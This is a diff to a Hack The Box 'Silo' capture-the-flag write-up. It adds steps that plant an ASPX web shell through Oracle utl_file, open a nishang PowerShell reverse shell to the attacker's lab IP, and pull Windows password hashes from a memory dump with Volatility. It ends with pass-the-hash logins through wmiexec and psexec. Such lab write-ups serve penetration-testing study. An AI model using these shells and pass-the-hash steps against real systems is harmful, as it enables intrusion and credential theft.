@@ -14,6 +14,8 @@ tags:
   - ODAT
   - Oracle
   - Metasploit
+  - sqlplus64
+  - 
 ---
 
 ![](/assets/images/htb-writeup-silo/silo_logo.png)
@@ -288,7 +290,7 @@ SQL> declare
   2    f utl_file.file_type;
   s varchar(6000) := '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("</pre>");}</script><HTML><body ><form id="cmd" method="post" runat="server"><asp:TextBox id="txtArg"  runat="server" Width="250px"></asp:TextBox><asp:Button id="testing"  runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button><asp:Label id="lblText" runat="server">Command:</asp:Label></form></body></HTML>';
 begin
-  f := utl_file.fopen('/inetpub/wwwroot', 'CommentsWelcome.aspx','W');
+  f := utl_file.fopen('/inetpub/wwwroot', 'BadWebShellToHack.aspx','W');
   utl_file.put_line(f,s);
   utl_file.fclose(f);
 end;
@@ -298,9 +300,174 @@ end;
 PL/SQL procedure successfully completed.
 ```
 ![](/assets/images/htb-writeup-silo/silo1.png)
-***
+
+For a better shell, let's use nishang.
+```bash
+git clone https://github.com/samratashok/nishang
+❯ ls
+❯ git clone https://github.com/samratashok/nishang
+Cloning into 'nishang'...
+remote: Enumerating objects: 1699, done.
+remote: Counting objects: 100% (8/8), done.
+remote: Compressing objects: 100% (7/7), done.
+remote: Total 1699 (delta 2), reused 4 (delta 1), pack-reused 1691
+Receiving objects: 100% (1699/1699), 10.88 MiB | 14.94 MiB/s, done.
+Resolving deltas: 100% (1061/1061), done.
+❯ ls
+ nishang
+❯ cp nishang/Shells/Invoke-PowerShellTcp.ps1  .
+❯ nvim Invoke-PowerShellTcp.ps1 #We add Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 4126 at the end of the script.
+❯ ls
+ nishang   Invoke-PowerShellTcp.ps1
+❯ mv Invoke-PowerShellTcp.ps1 badReverseShell.ps1
+❯ python3 -m http.server 80 #Share this file
+```
+I prefer to add this line at the end of the script
+```bash
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 4127
+```
+You only have to wait for the connection
+```bash
+❯ rlwrap nc -lvnp 4127
+listening on [any] 4127 ...
+connect to [10.10.14.9] from (UNKNOWN) [10.129.80.186] 49171
+Windows PowerShell running as user SILO$ on SILO
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\windows\system32\inetsrv>whoami
+iis apppool\defaultapppool
+```
+
+What version of Windows is? (Different ways)
+```powershell
+C:\Users\Administrator\Desktop>systeminfo | findstr /B /I "os"
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+
+C:\Users\Administrator\Desktop>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+```
+
+Now, we need to escalate privileges. There is a interesting file near the user.txt
+```powershell
+    Directory: C:\users\phineas\desktop
 
 
-User flag: b2397834bc61db5f4662b02f2b61abec
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+-a---          1/5/2018  10:56 PM        300 Oracle issue.txt
+-ar--         9/25/2022  10:15 PM         34 user.txt
 
-Root flag: e0bd696617d563b54bbe214080d25cc2
+
+PS C:\users\phineas\desktop>get-content "Oracle issue.txt"
+Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):
+
+Dropbox link provided to vendor (and password under separate cover).
+
+Dropbox link
+https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0
+
+link password:
+?%Hm8646uC$
+```
+If we use this password, we will get an error
+
+![](/assets/images/htb-writeup-silo/silo2.png)
+
+
+It is a encoding error. First, we could try to see it in our machine. If that does not work we can Base64 encode the file in the victim machine
+
+Transfer the file with impacket-smbserver
+- In our machine
+```bash
+❯ sudo impacket-smbserver shareCreatedToCheckThePassword $(pwd) -smb2support -username m1l0js -password m1l0js
+```
+- In the victim machine
+![](/assets/images/htb-writeup-silo/silo3.png)
+
+
+It does not work. We still see the '?' which means that our encoding is not able to represent the correct value. So, let's Base64 encode the file
+- In the victim machine
+```powershell
+PS C:\users\phineas\desktop>
+$ContentOfTheFile = Get-Content "Oracle issue.txt"
+$FileEncoded = [System.Text.Encoding]::UTF8.GetBytes($ContentOfTheFile)
+[System.Convert]::ToBase64String($FileEncoded)
+U3VwcG9ydCB2ZW5kb3IgZW5nYWdlZCB0byB0cm91Ymxlc2hvb3QgV2luZG93cyAvIE9yYWNsZSBwZXJmb3JtYW5jZSBpc3N1ZSAoZnVsbCBtZW1vcnkgZHVtcCByZXF1ZXN0ZWQpOiAgRHJvcGJveCBsaW5rIHByb3ZpZGVkIHRvIHZlbmRvciAoYW5kIHBhc3N3b3JkIHVuZGVyIHNlcGFyYXRlIGNvdmVyKS4gIERyb3Bib3ggbGluayAgaHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2gvNjlza3J5emZzemI3ZWxxL0FBRFpuUUViYnFEb0lmNUwyZDBQQnhFTmE/ZGw9MCAgbGluayBwYXNzd29yZDogwqMlSG04NjQ2dUMk
+```
+- In our machine
+```bash
+❯ echo -n U3VwcG9ydCB2ZW5kb3IgZW5nYWdlZCB0byB0cm91Ymxlc2hvb3QgV2luZG93cyAvIE9yYWNsZSBwZXJmb3JtYW5jZSBpc3N1ZSAoZnVsbCBtZW1vcnkgZHVtcCByZXF1ZXN0ZWQpOiAgRHJvcGJveCBsaW5rIHByb3ZpZGVkIHRvIHZlbmRvciAoYW5kIHBhc3N3b3JkIHVuZGVyIHNlcGFyYXRlIGNvdmVyKS4gIERyb3Bib3ggbGluayAgaHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2gvNjlza3J5emZzemI3ZWxxL0FBRFpuUUViYnFEb0lmNUwyZDBQQnhFTmE/ZGw9MCAgbGluayBwYXNzd29yZDogwqMlSG04NjQ2dUMk | base64 -d
+Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):  Dropbox link provided to vendor (and password under separate cover).  Dropbox link  https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0  link password: £%Hm8646uC$
+```
+Download the zip
+![](/assets/images/htb-writeup-silo/silo4.png)
+
+
+```bash
+❯ ls
+ MEMORY DUMP.zip
+❯ unzip MEMORY\ DUMP.zip
+Archive:  MEMORY DUMP.zip
+warning:  stripped absolute path spec from /
+mapname:  conversion of  failed
+ extracting: SILO-20180105-221806.zip
+❯ ls
+ MEMORY DUMP.zip   SILO-20180105-221806.zip
+❯ file SILO-20180105-221806.zip
+SILO-20180105-221806.zip: Zip archive data, at least v2.0 to extract
+❯ unzip SILO-20180105-221806.zip
+Archive:  SILO-20180105-221806.zip
+  inflating: SILO-20180105-221806.dmp
+❯ ls
+ MEMORY DUMP.zip   SILO-20180105-221806.dmp   SILO-20180105-221806.zip
+❯ file SILO-20180105-221806.dmp
+SILO-20180105-221806.dmp: MS Windows 64bit crash dump, full dump, 261996 pages
+```
+
+We will use Volatility to analyze this file. You could search more info about this tool in sites like [this](https://www.varonis.com/blog/how-to-use-volatility) one or [this](https://blog.onfvp.com/post/volatility-cheatsheet/)
+
+```bash```
+
+```bash
+❯ python3 volatility3/vol.py -f SILO-20180105-221806.dmp  windows.hashdump.Hashdump
+Volatility 3 Framework 2.4.0
+Progress:  100.00               PDB scanning finished
+User    rid     lmhash  nthash
+
+Administrator   500     aad3b435b51404eeaad3b435b51404ee        9e730375b7cbcebf74ae46481e07b0c7
+Guest           501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
+Phineas         1002    aad3b435b51404eeaad3b435b51404ee        8eacdd67b77749e65d3b3d5c110b0969
+```
+
+```bash
+❯ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 htb.local/administrator@10.129.145.237
+
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+silo\administrator
+
+C:\>[-]
+❯ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 htb.local/administrator@10.129.145.237
+
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 10.129.145.237.....
+[*] Found writable share ADMIN$
+[*] Uploading file LcVVnEZn.exe
+[*] Opening SVCManager on 10.129.145.237.....
+[*] Creating service MtAu on 10.129.145.237.....
+[*] Starting service MtAu.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
